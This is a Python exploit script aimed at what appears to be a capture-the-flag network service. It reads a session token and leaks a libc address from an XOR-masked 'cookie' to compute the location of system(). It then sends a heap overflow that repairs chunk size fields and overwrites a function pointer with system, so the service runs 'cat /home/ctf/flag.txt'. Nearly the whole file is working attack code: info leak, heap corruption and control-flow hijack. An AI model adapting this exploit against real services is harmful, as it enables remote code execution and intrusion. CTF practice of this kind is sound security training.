import socket, struct, sys, re, time
sys.path.insert(0, __file__.rsplit("\\",1)[0])
import client

HOST, PORT = sys.argv[1], int(sys.argv[2])
PUTS_OFF = 0x83cc0
SYSTEM_OFF = 0x52fd0
C = 0x5a5a5a5a41414141

s = socket.create_connection((HOST, PORT))
banner = client.rd(s, 2.0)
m = re.search(rb"session token: ([0-9a-f]{8})", banner)
token = int(m.group(1), 16)
tok12 = (token & 0xffffffff) << 12
client.TOKEN = token
print("[token]", hex(token))

def pkt(ptype, payload, t=2.0):
    client.send_packet(s, ptype, payload)
    return client.rd(s, t)

pkt(2, struct.pack("<I", (token ^ 0xc0ffee00) & 0xffffffff))
pkt(3, struct.pack("<H", 1) + b"A")
pkt(4, b"\x00\x00\x00")

# leak puts
r = pkt(4, b"P")
mm = re.search(rb"proc cookie: 0x([0-9a-f]+)", r)
puts = (int(mm.group(1),16) ^ C ^ tok12) & 0xffffffffffffffff
libc = puts - PUTS_OFF
system = (libc + SYSTEM_OFF) & 0xffffffffffffffff
print("[puts ]", hex(puts))
print("[libc ]", hex(libc))
print("[system]", hex(system))

# overflow: command at slot+0x60, fp(=system) at slot+0x80
cmd = b"cat /home/ctf/flag.txt\x00"
ov = bytearray(0x100)
ov[0x60:0x60+len(cmd)] = cmd
struct.pack_into("<Q", ov, 0x80, system)   # fp = system
# restore chunk size fields corrupted by overflow (try: two 0x20 chunks + report 0x130)
struct.pack_into("<Q", ov, 0x18, 0x21)     # chunk1 size
struct.pack_into("<Q", ov, 0x38, 0x21)     # chunk2 size
struct.pack_into("<Q", ov, 0x58, 0x131)    # report size
pkt(3, struct.pack("<H", 0x100) + bytes(ov))

# leak D to confirm report+0x20 == system
r = pkt(4, b"D")
mm = re.search(rb"analyzer cookie: 0x([0-9a-f]+)", r)
if mm:
    fp = (int(mm.group(1),16) ^ C ^ tok12) & 0xffffffffffffffff
    print("[fp after ov ]", hex(fp), "== system?", fp == system)
else:
    print("[D leak] no analyzer cookie; raw:", r)

# ANALYZE
out = pkt(5, b"", t=5.0)
print("[ANALYZE raw]", repr(out))
# check if connection still alive
try:
    client.send_packet(s, 1, b"")
    alive = client.rd(s, 2.0)
    print("[after HELLO]", repr(alive[:120]))
except Exception as e:
    print("[HELLO err]", e)
s.close()
